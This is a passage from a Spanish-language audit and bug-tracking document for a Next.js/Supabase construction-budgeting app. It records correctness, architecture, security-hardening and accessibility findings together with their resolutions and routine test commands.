- **Descripción**: Se snapshotea `precio_origen_snapshot` pero no `motivo_precio_fijado`. Tras emitir, cambios en el motivo del borrador se pierden del histórico oficial.
- **Solución propuesta**: Agregar columna `motivo_precio_fijado_snapshot` a `presupuesto_version_partidas` y `presupuesto_version_partida_recursos`. Migración nueva.
- **Notas**: Resuelto en workspace el 2026-05-20: migración `20260520140000_chunk1_financial_validation_fixes.sql` agrega snapshots de motivo y `emitOfficialBudgetVersion` los congela. `pnpm run supabase:reset` aplicó migraciones/seed pero terminó con `storage unhealthy`; `pnpm run supabase:status` mostró el stack local corriendo y `pnpm run supabase:types` regeneró tipos. Verificado con `pnpm run supabase:types`, `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

### COR-14: `compareByTotalPriceDesc` en empate prefiere cotización antigua

- **Estado**: [⊘] No es bug (verificado contra el código)
- **Archivo**: `lib/calculations/client-prices.ts:82-90`
- **Descripción original**: Se sospechaba que en empate de precios se elegía la cotización más antigua.
- **Verificación**: traza completa: `compareByTotalPriceDesc(first, second)` en empate retorna `compareQuoteDates(second, first)`. `compareQuoteDates(a, b)` retorna `dateValue(a) - dateValue(b)`. Sustituyendo: `compareQuoteDates(second, first) = dateValue(second) - dateValue(first)`. Si `second` es más reciente, retorna positivo → en sort, `first` se coloca después → **la cotización más reciente queda primero**. La lógica es correcta.
- **Notas**: _(vacío)_

### COR-15: `percentage` permite hasta 100% para IGV/utilidad/GG

- **Estado**: [x] Resuelto
- **Archivo**: `lib/validations/shared.ts:47-49`
- **Descripción**: Un IGV o utilidad de 100% es semánticamente raro pero pasa validación.
- **Decisión a tomar**: confirmar con el usuario si tiene sentido permitir hasta 100% o cap más conservador (50%). En construcción peruana el IGV es 18% fijo y GG/utilidad rara vez superan 30%. No es bug — es validación más estricta opcional.
- **Notas**: Decisión cerrada el 2026-05-20: mantener porcentajes en rango `0..100` para este MVP. No requiere cambio funcional. Verificado con `pnpm run supabase:types`, `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

### COR-16: Tests sin coverage del flujo crítico de presupuestos

- **Estado**: [x] Resuelto
- **Archivo**: `lib/data/budgets.test.ts`
- **Descripción**: No hay tests para `emitOfficialBudgetVersion`, `selectDraftResourceClientQuote`, `overrideDraftClientPrice`, `refreshDraftCurrentPrices`. Todo el flujo crítico de mutación de borradores está sin cobertura.
- **Solución propuesta**: Escribir tests para estos flujos después de resolver los bugs ARC-01 a ARC-08. Antes sería codificar comportamiento incorrecto.
- **Notas**: Resuelto en workspace el 2026-05-20: `lib/data/budgets.test.ts` cubre RPC de emisión, mapeo de conflicto stale, RPC de agregar partida y allowlist de actualización de borrador; pgTAP cubre permisos, stale, no parciales y órdenes. Chunk 8 agregó cobertura para `selectDraftResourceClientQuote` y `overrideDraftClientPrice`. Verificado con `pnpm run supabase:types`, `pnpm exec supabase test db supabase/tests/rls.sql`, `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

### ARC-09: `recalculateDraftTotals` fetches bundle entero después de cada mutación

- **Estado**: [x] Resuelto
- **Archivo**: `lib/data/budgets.ts:1549-1580`
- **Descripción**: Cada mutación dispara 4+ queries de re-fetch antes de UPDATE de totales, luego otro fetch para retornar. `updateMetrado` termina con 10+ queries por una sola edición.
- **Solución propuesta**: Calcular totales en memoria a partir del estado que ya tenemos. Solo refetch al final para retornar.
- **Notas**: Resuelto en workspace el 2026-05-21: `recalculate_budget_draft_totals` recalcula líneas no fijadas y totales en SQL. Chunk 8 ajustó la RPC para devolver el bundle actualizado y `recalculateDraftTotals` lo usa directamente, dejando `getActiveBudgetDraft` solo como fallback defensivo si la RPC no retorna bundle. Verificado con `pnpm run supabase:reset`, `pnpm run supabase:types`, pgTAP, `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

### ARC-10: Workspace waterfall repetido en cada página

- **Estado**: [x] Resuelto
- **Archivo**: `app/page.tsx`, `app/proveedores/page.tsx`, `app/recursos/page.tsx`, `app/partidas/page.tsx`, `app/presupuestos/page.tsx`
- **Descripción**: Cada página ejecuta `auth.getUser()` → `organizacion_miembros` → `proyecto_miembros` antes de tocar datos de negocio. Se repite en cada refetch de Realtime.
- **Solución propuesta**: Hook `useWorkspace()` con React Context o resolver vía Server Component / route handler que cachee la sesión completa.
- **Notas**: Resuelto en workspace el 2026-05-21: se agregó `lib/data/workspace.ts` para resolver organización/proyecto/roles/scope de forma compartida y las rutas principales usan ese resolver en sus cargas. Chunk 8 agregó caché browser-side por cliente singleton, invalida resultados fallidos y evita repetir el waterfall de auth/membresías durante refetches y navegación cliente. Verificado con `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint`, `pnpm build` y smoke de navegador.

### ARC-11: Dashboard carga todas las líneas de todos los proyectos para contarlas

- **Estado**: [x] Resuelto
- **Archivo**: `lib/data/budgets.ts:136-161`
- **Descripción**: `listBudgetDashboardProjects` trae todas las filas de `presupuesto_borrador_partidas` y `presupuesto_version_partidas` solo para mostrar el conteo. Con 10 proyectos × 50 partidas son 500 filas para mostrar números.
- **Solución propuesta**: Reemplazar por queries con `count: "exact", head: true` o una RPC que devuelva el agregado.
- **Notas**: Resuelto en workspace el 2026-05-21: `list_budget_dashboard_projects()` devuelve agregados y conteos desde SQL sin traer todas las líneas al cliente.

### ARC-12: `listPartidaResources` tiene query duplicado

- **Estado**: [x] Resuelto
- **Archivo**: `lib/data/items.ts:109-131, 300-304`
- **Descripción**: `listPartidaResources` internamente llama a `getPartidaById`. Cuando se llama en paralelo con `getPartidaById` en `createPartidaResource`, se ejecuta dos veces para la misma partida.
- **Solución propuesta**: Hacer una versión interna que no revalide scope (el scope ya fue validado por `getPartidaById`).
- **Notas**: Resuelto en workspace el 2026-05-21: `createPartidaResource` usa un helper interno de recursos APU cuando el scope/partida ya fueron validados.

### ARC-13: Validación cliente + servidor duplicada en `updateResourceQuote`

- **Estado**: [x] Resuelto
- **Archivo**: `lib/data/quotes.ts:199-210`
- **Descripción**: Hay un check client-side de `updated_at` antes del UPDATE y luego el check de DB con `.eq("updated_at", ...)`. El check cliente tiene TOCTOU; solo el DB-level importa.
- **Solución propuesta**: Eliminar el check client-side. Confiar en la respuesta del UPDATE.
- **Notas**: Resuelto en workspace el 2026-05-21: `updateResourceQuote` elimina el check stale previo y deja el conflicto optimista en el `UPDATE ... eq(updated_at)`.

### SEG-10: Information leakage en mensajes de error

- **Estado**: [x] Resuelto
- **Archivo**: `app/onboarding/page.tsx:60-61`, `lib/data/errors.ts:38-76`
- **Solución propuesta**: En `normalizeSupabaseError` no propagar `details` (que contiene `hint`, columnas, constraints) al cliente en producción. Loguear server-side; mostrar mensaje genérico al usuario.
- **Notas**: Resuelto en workspace el 2026-05-21: `normalizeSupabaseError` sanitiza detalles crudos de Supabase en produccion y devuelve mensaje generico para errores no controlados, conservando detalles de conflictos optimistas generados por la app. Cubierto por `lib/data/data.test.ts`.

### SEG-11: `presupuesto_borradores` permite `created_by = NULL`

- **Estado**: [x] Resuelto
- **Archivo**: `supabase/migrations/20260518000000_auth_rls_ownership.sql:565-580`
- **Descripción**: `coalesce(created_by, auth.uid()) = auth.uid()` pasa si el cliente envía `created_by = NULL` explícitamente. Se pierde trazabilidad.
- **Solución propuesta**: Reemplazar por `created_by = auth.uid()` directo. Igual para `updated_by`. Setear default a nivel columna con `auth.uid()`.
- **Notas**: Resuelto en workspace el 2026-05-20: se agregan defaults `auth.uid()` y policies de insert/update exigen `created_by = auth.uid()` y `updated_by = auth.uid()`. pgTAP cubre inserts/updates con NULL. Verificado con `pnpm run supabase:types`, `pnpm exec supabase test db supabase/tests/rls.sql`, `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

### SEG-12: Race condition en onboarding (workspace check + submit en paralelo)

- **Estado**: [x] Resuelto
- **Archivo**: `app/onboarding/page.tsx`, `supabase/migrations/20260518000000_auth_rls_ownership.sql` (RPC `create_organization_with_owner`)
- **Descripción**: Un usuario con membresía existente puede aterrizar en `/onboarding` si el redirect aún no resolvió y disparar la RPC, creando organizaciones duplicadas.
- **Solución propuesta**: En la RPC validar `if exists (select 1 from organizacion_miembros where user_id=auth.uid() and estado='activo') then raise exception ...`.
- **Notas**: Resuelto en workspace el 2026-05-20: `create_organization_with_owner` rechaza usuarios con membresía activa antes de crear organización/proyecto. pgTAP cubre el caso. Verificado con `pnpm run supabase:types`, `pnpm exec supabase test db supabase/tests/rls.sql`, `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

### SEG-13: Password policy débil

- **Estado**: [x] Resuelto remoto — el fix de código quedó completo y Cloudflare Turnstile quedó activo en Supabase remoto.
- **Archivo**: `app/registro/page.tsx:22-25`, `supabase/config.toml:177-180`
- **Descripción**: Solo length ≥ 8, sin complejidad, sin CAPTCHA. Permite brute force / abuso de signup.
- **Solución propuesta**: En `config.toml` setear `password_requirements = "lower_upper_letters_digits"` y `minimum_password_length = 12`. Activar CAPTCHA (`hcaptcha` o `turnstile`) en `[auth.captcha]` para producción.
- **Notas**: Resuelto en workspace el 2026-05-20: `supabase/config.toml` exige mínimo 12 caracteres y `lower_upper_letters_digits`; registro/actualización usan `validatePassword`. Verificado con `pnpm run supabase:types`, pgTAP, `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`. **Reclasificado el 2026-05-21 (Chunk 8c)**: el fix de código estaba completo y faltaba activar CAPTCHA en remoto. **Cerrado remoto el 2026-05-23**: Cloudflare Turnstile quedó activo en Supabase y Vercel tiene `NEXT_PUBLIC_TURNSTILE_SITE_KEY`.

### SEG-14: `redirectTo` dinámico con `window.location.origin`

- **Estado**: [x] Resuelto
- **Archivo**: `app/recuperar-clave/page.tsx:23-25`, `app/registro/page.tsx:31-34`
- **Descripción**: Si Supabase Auth no tiene whitelist estricta de Site URL / Additional Redirect URLs, un origin malicioso podría aceptarse.
- **Solución propuesta**: Forzar URL absoluta fija con `NEXT_PUBLIC_APP_URL` y restringir Additional Redirect URLs en el dashboard de Supabase remoto.
- **Notas**: Resuelto en workspace el 2026-05-20: `buildAppUrl` usa `NEXT_PUBLIC_APP_URL` con fallback local validado y reemplaza `window.location.origin` en registro y recuperación de contraseña. `.env.example`, `AGENTS.md` y producción documentan la variable. Verificado con `pnpm run supabase:types`, pgTAP, `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

### SEG-15: UUID de proyecto en query params

- **Estado**: [x] Resuelto
- **Archivo**: `app/presupuestos/page.tsx:171`
- **Descripción**: `?proyecto=<uuid>` viaja a analytics/referers a CDNs externos. Junto a cliente/ubicación facilita correlación.
- **Solución propuesta**: Migrar a path segment dinámico `/presupuestos/[proyectoId]` y configurar `Referrer-Policy: same-origin`.
- **Notas**: Resuelto en workspace el 2026-05-20: se agregó `/presupuestos/[proyectoId]`, dashboard/selector usan path segment y `/presupuestos?proyecto=<uuid>` redirige como compatibilidad temporal. `Referrer-Policy` quedó en `same-origin`. Verificado con `pnpm run supabase:types`, pgTAP, `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

### SEG-16: `setAuth` no se renueva en realtime al refrescar token

- **Estado**: [x] Resuelto
- **Archivo**: `lib/realtime/usePresenceChannel.ts:81-91`, `lib/realtime/useActivitySubscription.ts:65`
- **Descripción**: Se setea el JWT una vez por canal y no se escucha `TOKEN_REFRESHED`. Sesiones largas mantienen JWT viejo en el canal.
- **Solución propuesta**: Suscribirse a `supabase.auth.onAuthStateChange` y re-llamar `supabase.realtime.setAuth(access_token)` cuando el evento sea `TOKEN_REFRESHED`.
- **Notas**: Resuelto en workspace el 2026-05-20: `bindRealtimeAuth` centraliza `setAuth`, carga token inicial, actualiza Realtime en `TOKEN_REFRESHED` y limpia la suscripción al desmontar. Cubierto por `lib/realtime/auth.test.ts`.

### SEG-25: Grants amplios sobre sequences en `public`

- **Estado**: [x] Resuelto
- **Archivo**: `supabase/migrations/20260520164133_chunk3_auth_web_security_hardening.sql:31`
- **Descripción**: La migración del Chunk 3 corrigió SEG-18 enumerando grants por tabla, pero hace `grant usage, select on all sequences in schema public to authenticated`. Esto contradice el espíritu de SEG-18 — si se añade una secuencia nueva en migraciones futuras, queda expuesta automáticamente.
- **Solución propuesta**: enumerar las secuencias explícitamente o restringir al subset de tablas operativas. Migración nueva.
- **Notas**: Resuelto en workspace el 2026-05-21: migración `20260521170001_chunk8_security_hardening.sql` revoca grants amplios de sequences para `anon`/`authenticated` y evita defaults amplios futuros. Las tablas operativas usan UUID defaults, por lo que no requieren sequences públicas. Verificado con `pnpm run supabase:reset`, `pnpm run supabase:types`, pgTAP, `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

### SEG-27: `display_name` fallback inseguro en presence

- **Estado**: [x] Resuelto
- **Archivo**: `supabase/migrations/20260520171946_chunk4_realtime_presence_collaboration.sql:33`, `lib/realtime/presence.ts:43-53`
- **Descripción**: El trigger inicializa `display_name` con `split_part(email,'@',1)` sin verificar `email_verified`. Un usuario con email no verificado mostrará la parte local de su email como `actorName` en presence, vector residual del spoofing que SEG-23 pretendía cerrar.
- **Solución propuesta**: condicionar el default a `email_verified = true`, o usar un placeholder genérico (`"Usuario sin verificar"`) cuando no haya verificación. Ajustar `resolvePresenceIdentity` para reflejar el estado.
- **Notas**: Resuelto en workspace el 2026-05-21: migración `20260521170001_chunk8_security_hardening.sql` re-declara `private.sync_user_profile()` y el backfill para usar nombre/email solo con email verificado; perfiles no verificados caen a `Usuario colaborador`. `resolvePresenceIdentity` aplica la misma regla en cliente. Cubierto por `lib/realtime/presence.test.ts` y verificado con reset, tipos, pgTAP, tests, tsc, lint y build.

### UX-02: Tablas sin `scope="col"` en headers

- **Estado**: [x] Resuelto
- **Archivo**: `components/presupuestos/BudgetTable.tsx`, `components/proveedores/ProviderTable.tsx`, `components/recursos/ResourceTable.tsx`, `components/partidas/PartidaTable.tsx`, `app/cronogramas/page.tsx`
- **Descripción**: Headers sin atributo de accesibilidad para screen readers.
- **Solución propuesta**: Agregar `scope="col"` a cada `<th>`.
- **Notas**: Resuelto en workspace el 2026-05-21: se agrego `scope="col"` a headers de dashboard, cronogramas, presupuestos, recursos, proveedores, partidas, APU y mini-tablas; headers de acciones sin texto tienen `aria-label`.

### UX-03: Filtros y selección no persisten en URL

- **Estado**: [x] Resuelto
- **Archivo**: Todas las pages de CRUDs y `/presupuestos`
- **Descripción**: Filtros, búsquedas y selecciones viven en `useState` local. Refrescar pierde el contexto.
- **Solución propuesta**: Usar `useSearchParams` + `router.replace` para selecciones críticas (mínimo: línea seleccionada en presupuestos, filtros en cada CRUD).
- **Notas**: Resuelto en workspace el 2026-05-21: proveedores, recursos y partidas sincronizan filtros con query params (`q`, `estado`, `cliente`, `tipo`, `proveedor`, `categoria`); presupuestos persiste la linea seleccionada con `linea`.

### UX-04: Forms sin `htmlFor`/`id` en inputs

- **Estado**: [x] Resuelto
- **Archivo**: `components/proveedores/ProviderFormPanel.tsx`, `components/recursos/ResourceFormPanel.tsx`, `components/partidas/PartidaFormPanel.tsx`
- **Descripción**: `<label>` envolviendo al input es HTML válido y accesible. Sin embargo, agregar `id` + `htmlFor` explícitos mejora consistencia y robustez con algunas tecnologías de asistencia en forms complejos.
- **Solución propuesta**: Agregar `id` + `htmlFor` explícitos. No es bug funcional.
- **Notas**: Resuelto en workspace el 2026-05-21: formularios de proveedor, recurso y partida generan ids estables con `useId` y enlazan `label htmlFor` en inputs, selects, textareas y checkboxes.

---

## Bajas

Nice to have. Mejoras de pulido que pueden ir después del primer release.

### COR-17: `precio_unitario_snapshot = 0` permitido en validación

- **Estado**: [x] Resuelto
- **Archivo**: `lib/validations/budgets.ts:44`
- **Descripción**: `nonNegativeNumber` acepta 0. Un precio = 0 es semánticamente raro pero podría ser válido para partidas de regalo o promoción.
- **Decisión a tomar**: confirmar con el usuario si se acepta precio 0 (placeholder, partidas gratis) o se requiere `.positive()`. No es bug — es decisión de validación.
- **Notas**: Decisión cerrada el 2026-05-20: mantener precio unitario `0` permitido para partidas gratuitas, placeholders o promociones. No requiere cambio funcional. Verificado con `pnpm run supabase:types`, `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

### COR-18: Permitir emitir versión oficial de borrador vacío

- **Estado**: [x] Resuelto
- **Archivo**: `lib/data/budgets.ts:1310-1487`
- **Descripción**: No hay guardia contra `lines.length === 0`. Se puede emitir una versión oficial con subtotal = 0.
- **Solución propuesta**: Validar al inicio de `emitOfficialBudgetVersion`: si no hay líneas, retornar `validationError("No se puede emitir un borrador vacío")`.
- **Notas**: Resuelto en workspace el 2026-05-20: `emitOfficialBudgetVersion` retorna error de validación si el borrador no tiene líneas. Verificado con `pnpm run supabase:types`, `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

### COR-19: `durationDays = 0.5` validación inconsistente

- **Estado**: [x] Resuelto
- **Archivo**: `lib/calculations/schedule.ts:43`
- **Descripción**: `validateTask` rechaza `durationDays <= 0` pero `suggestScheduleDurationDays` redondea hacia arriba a mínimo 1. Mensaje "mayor que 0" mientras acepta 0.5.
- **Solución propuesta**: Decidir: o la duración mínima es 1 día (entero), o se acepta 0.5 día. Documentar y validar consistentemente.
- **Notas**: Resuelto por decisión el 2026-05-20: `durationDays` acepta fracciones positivas como `0.5`; los tests documentan ese contrato. Verificado con `pnpm run supabase:types`, `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

### COR-20: `precio_cliente_origen` nullable en types

- **Estado**: [x] Resuelto
- **Archivo**: `types/domain.ts:283`
- **Descripción**: Campo opcional cuando `precio_cliente_actual` está seteado debería ser obligatorio.
- **Solución propuesta**: Usar unión discriminada: `{ precio: null } | { precio: number, origen: PrecioClienteOrigen }`.
- **Notas**: Resuelto en workspace el 2026-05-20: `types/domain.ts` usa unión para exigir origen cuando existe precio cliente y la migración `20260520140000_chunk1_financial_validation_fixes.sql` agrega constraint de consistencia en base de datos. `pnpm run supabase:types` regeneró tipos. Verificado con `pnpm run supabase:types`, `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

### ARC-14: `getChangedFields` siempre incluye `updated_at` como cambio

- **Estado**: [x] Resuelto
- **Archivo**: `lib/data/audit.ts:7-29`
- **Descripción**: Compara todas las keys con `Object.is`. `updated_at` cambia con cada UPDATE → siempre aparece en `changedFields`. Audit log inflado.
- **Solución propuesta**: Excluir `updated_at`, `created_at` y otras columnas de metadata del comparador.
- **Notas**: Resuelto en workspace el 2026-05-21: `getChangedFields` ignora metadata audit-only (`created_at`, `updated_at`, `created_by`, `updated_by`). Cubierto por `lib/data/data.test.ts`.

### ARC-15: `reloadQuotes` se llama tras mutaciones que no cambian precios

- **Estado**: [x] Resuelto
- **Archivo**: `app/presupuestos/page.tsx` (en `handleBundleRetryResult`)
- **Descripción**: Cotizaciones no cambian con `updateMetrado`, `deleteLine`, `toggleLineLock`, `toggleResourceLock`, pero se recargan igual.
- **Solución propuesta**: Solo llamar `reloadQuotes` después de `addDraftPartida`, `refreshClientPrices`, `selectClientQuote`.
- **Notas**: Resuelto en workspace el 2026-05-21: `handleBundleRetryResult` recibe política explícita; solo recarga cotizaciones tras agregar partida, refrescar precios cliente o seleccionar cotización.

### ARC-16: `presupuestos/page.tsx` es God component con retry handlers duplicados

- **Estado**: [x] Resuelto
- **Archivo**: `app/presupuestos/page.tsx` (1405 líneas)
- **Descripción**: 8 funciones de retry casi idénticas; `ConflictResolutionDialog` y `ActivityToasts` renderizados 3 veces.
- **Solución propuesta**: Extraer `retryWithConflict(fn)` genérico. Subir los modales al `AppLayout` o a un provider raíz.
- **Notas**: Resuelto en workspace el 2026-05-21: `PresupuestosWorkspace` extrae `BudgetWorkspaceFrame` para overlays compartidos y centraliza la ejecucion de retries de bundle con `runBundleRetry`, manteniendo el contrato visual y de mutaciones. Chunk 8 consolidó los retries específicos restantes en helpers genéricos de conflicto para bundles y emisión oficial. Verificado con `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

### ARC-17: `budgets.ts` es God file (1670 líneas)

- **Estado**: [x] Resuelto
- **Archivo**: `lib/data/budgets.ts` (1670 líneas según `wc -l` al 2026-05-20)
- **Descripción**: Maneja dashboard, borradores, líneas, recursos, precios cliente, versiones, recálculos. Difícil de navegar.
- **Solución propuesta**: Dividir en `budget-draft.ts`, `budget-lines.ts`, `budget-resources.ts`, `budget-versions.ts`, `budget-calculations.ts`. Esta división tiene sentido hacerla **después** de los fixes de ARC-01 y ARC-02 (conversión a RPCs) porque varios de los métodos podrían dejar de existir o reducirse considerablemente.
- **Notas**: Resuelto en workspace el 2026-05-21: `lib/data/budgets.ts` queda como fachada publica compatible y la implementacion se divide en `lib/data/budgets/` por dashboard, drafts, lines, resources, versions, helpers y types. Cubierto por `lib/data/budgets.test.ts`.

### ARC-18: Pages son `"use client"` puro sin Server Components

- **Estado**: [x] Resuelto
- **Archivo**: Todas las pages
- **Descripción**: Cada página arranca en cliente y hace waterfall completo antes de mostrar datos. Next.js 14 App Router permite SSR.
- **Solución propuesta**: Convertir al menos el `layout.tsx` raíz a Server Component que resuelva sesión + organizacion_id y pase por props/contexto.
- **Notas**: Resuelto en workspace el 2026-05-21: las rutas principales (`/`, `/proveedores`, `/recursos`, `/partidas`, `/partidas/[id]`, `/presupuestos`, `/presupuestos/[proyectoId]`) quedaron como wrappers Server Component con child cliente para Realtime/formularios. Chunk 8 cerró el waterfall residual con caché compartida por el singleton de Supabase en browser, sin cambiar contratos visuales ni rutas. Verificado con `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint`, `pnpm build` y smoke de navegador.

### SEG-17: `set_updated_at` sin `set search_path`

- **Estado**: [x] Resuelto
- **Archivo**: `supabase/migrations/20260514000000_initial_schema.sql:13-21`
- **Descripción**: Trigger inicial sin `set search_path`. Buenas prácticas de Supabase requieren hardening.
- **Solución propuesta**: Migración nueva que reemplace la función con `set search_path = ''`.
- **Notas**: Resuelto en workspace el 2026-05-20: migración `20260520164133_chunk3_auth_web_security_hardening.sql` reemplaza `set_updated_at()` con `set search_path = ''`; pgTAP valida que siga actualizando `updated_at`. Verificado con `pnpm run supabase:types`, pgTAP, `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

### SEG-18: Grants amplios sobre todo `public`

- **Estado**: [x] Resuelto
- **Archivo**: `supabase/migrations/20260518000000_auth_rls_ownership.sql:283`
- **Descripción**: `grant select, insert, update, delete on all tables in schema public to authenticated`. RLS es la única defensa.
- **Solución propuesta**: Reemplazar por grants explícitos por tabla. Si una policy se elimina por error, no quedaría todo expuesto.
- **Notas**: Resuelto en workspace el 2026-05-20: la migración revoca grants globales sobre `public` y repone grants explícitos por tabla usada por la app, manteniendo RLS como control de filas. pgTAP valida operaciones principales. Verificado con `pnpm run supabase:types`, pgTAP, `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

### SEG-19: `activity_events.before/after` sin límite de tamaño

- **Estado**: [x] Resuelto
- **Archivo**: `supabase/migrations/20260515000000_collaborative_model.sql:378-380`
- **Descripción**: Sin constraint de tamaño. Persiste datos sensibles para siempre. Compliance issue para LGPD/GDPR.
- **Solución propuesta**: Agregar check de tamaño máximo de payload (ej. `length(before::text) < 50000`). Definir política de retención y purge.
- **Notas**: Resuelto en workspace el 2026-05-20: `activity_events` limita `before`, `after`, `changed_fields` y `metadata` a 50000 caracteres serializados por campo; pgTAP cubre rechazo de payload excesivo. Verificado con `pnpm run supabase:types`, pgTAP, `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

### SEG-20: Onboarding RPC no valida formato de RUC

- **Estado**: [x] Resuelto
- **Archivo**: `supabase/migrations/20260518000000_auth_rls_ownership.sql` (RPC `create_organization_with_owner`)
- **Descripción**: Acepta cualquier texto y la constraint `^[0-9]{11}$` rechaza al INSERT con mensaje críptico.
- **Solución propuesta**: Validar formato en la RPC antes del INSERT y devolver mensaje claro al usuario.
- **Notas**: Resuelto en workspace el 2026-05-20: `create_organization_with_owner` normaliza RUC vacío y valida `^[0-9]{11}$` con mensaje claro antes del INSERT. `optionalRucSchema` quedó compartido y testeado. Verificado con `pnpm run supabase:types`, `pnpm exec supabase test db supabase/tests/rls.sql`, `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

### SEG-21: `escapeHtml` custom incompleto

- **Estado**: [x] Resuelto
- **Archivo**: `lib/exports/budget.ts:574-581`
- **Descripción**: No escapa backtick ni `=`. **No es bug actual** porque todo el uso es en text content dentro de `<td>...</td>` y no en atributos no-quoted ni scripts. Es hardening por si el helper se reusa en otros contextos.
- **Solución propuesta**: Reemplazar con librería estándar (`he`, `escape-html`) o documentar restricciones del helper en un comentario JSDoc.
- **Notas**: Resuelto en workspace el 2026-05-21: el helper documenta que solo aplica a nodos de texto HTML de exportaciones imprimibles y ahora escapa backtick y `=` ademas de caracteres HTML base. Cubierto por `lib/exports/budget.test.ts`.

### SEG-22: `activity_events_insert_authorized` no valida `entity_id`/`entity_type`

- **Estado**: [x] Resuelto
- **Archivo**: `supabase/migrations/20260518000000_auth_rls_ownership.sql:719-734`
- **Descripción**: Un usuario puede insertar eventos con `entity_type` y `entity_id` arbitrarios, ensuciando el feed de actividad.
- **Solución propuesta**: Validar `entity_type` contra whitelist (enum o check constraint). Opcionalmente trigger que verifique existencia del `entity_id`.
- **Notas**: Resuelto en workspace el 2026-05-20: nueva función `is_valid_activity_entity` aplica whitelist y verifica existencia/scope de entidad; policy `activity_events_insert_authorized` la exige. pgTAP cubre tipo inválido, entidad inexistente y entidad de otra organización. Verificado con `pnpm run supabase:types`, `pnpm exec supabase test db supabase/tests/rls.sql`, `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

### SEG-23: `actorName` en presence controlado por usuario

- **Estado**: [x] Resuelto
- **Archivo**: `lib/realtime/usePresenceChannel.ts:83-86`
- **Descripción**: Usuario puede manipular `user_metadata.name` y spoof su nombre en presencia.
- **Solución propuesta**: Mostrar también el email verificado en la UI de presencia. Opcional: restringir caracteres en metadata vía trigger en `auth.users`.
- **Notas**: Resuelto en workspace el 2026-05-20: Presence ya no confía en `user_metadata` ni payloads de identidad; la UI resuelve `display_name`/email verificado desde `user_profiles` bajo RLS y cae a "Usuario colaborador" si no hay perfil visible.

### SEG-24: `current_user` shadow en RPC SQL

- **Estado**: [x] Resuelto
- **Archivo**: `supabase/migrations/20260518000000_auth_rls_ownership.sql:195`
- **Descripción**: La variable local `current_user` shadow a la palabra reservada de Postgres. **No es bug funcional** — Postgres permite este shadow y la migración compila correctamente. Solo afecta legibilidad para futuros lectores y herramientas de análisis estático.
- **Solución propuesta**: En una migración futura que toque esta RPC por otra razón, renombrar a `actor_id` u otra cosa. No urgente.
- **Notas**: Resuelto en workspace el 2026-05-21: migracion `20260521155627_chunk7_refactor_hardening.sql` re-declara `create_organization_with_owner` con variable `actor_id` y `set search_path = ''`, sin reescribir migraciones historicas.

### ARC-19: Bloque de validación duplicado en `useActivitySubscription`

- **Estado**: [x] Resuelto
- **Archivo**: `lib/realtime/useActivitySubscription.ts:85-100`
- **Descripción**: El bloque `if (shouldProcessExternalEvent)` aparece dos veces consecutivas. El segundo es código muerto (siempre verdadero al llegar ahí). No es bug funcional pero introduce ruido y un nombre confuso. Probablemente residuo de la edición que aplicó PER-01.
- **Solución propuesta**: eliminar el bloque duplicado y unificar la nomenclatura (`shouldProcessExternalEvent` vs `shouldShowActivityToast`).
- **Notas**: Resuelto en workspace el 2026-05-21: `useActivitySubscription` elimina el bloque redundante y usa `shouldRefetchExternalActivity` para el gate de toast/refetch. Cubierto por tests realtime y verificado con `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

### UX-10: Topbar llama `createBrowserClient()` dos veces (regresión latente de UX-08)

- **Estado**: [x] Resuelto
- **Archivo**: `components/layout/Topbar.tsx:23,52`
- **Descripción**: Tras aplicar UX-08 (`useCallback` + `isSigningOut`), el componente sigue llamando `createBrowserClient()` dos veces en líneas 23 y 52. Hoy es inocuo gracias al singleton de ARC-03, pero si alguien rompe el singleton, UX-08 vuelve a manifestarse.
- **Solución propuesta**: extraer una sola referencia al cliente al inicio del componente y reutilizarla en `handleSignOut`. Aplicar el mismo patrón a otros componentes que invoquen `createBrowserClient()` repetidamente como defensa preventiva.
- **Notas**: Resuelto en workspace el 2026-05-21: `Topbar` crea una sola referencia memoizada al cliente Supabase y la reutiliza en el sign-out, manteniendo bloqueo de doble submit. Verificado con `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

### UX-05: `usePresenceChannel` puede setState después de unmount

- **Estado**: [x] Resuelto
- **Archivo**: `lib/realtime/usePresenceChannel.ts:107-117`
- **Descripción**: El callback async de `subscribe` no verifica `isCancelled`. Genera warning de React si el componente se desmonta durante el subscribe.
- **Solución propuesta**: Checkear `isCancelled` antes de cada `setStatus` dentro del callback.
- **Notas**: Resuelto en workspace el 2026-05-20: `usePresenceChannel` usa guardas `isCancelled` en callbacks async, limpia refs y desuscribe canal/listener en cleanup.

### UX-06: `ActivityToasts` sin `aria-live`

- **Estado**: [x] Resuelto
- **Archivo**: `components/shared/ActivityToasts.tsx:27`
- **Descripción**: Toasts dinámicos no se anuncian a screen readers.
- **Solución propuesta**: Agregar `role="status" aria-live="polite"` al contenedor de toasts.
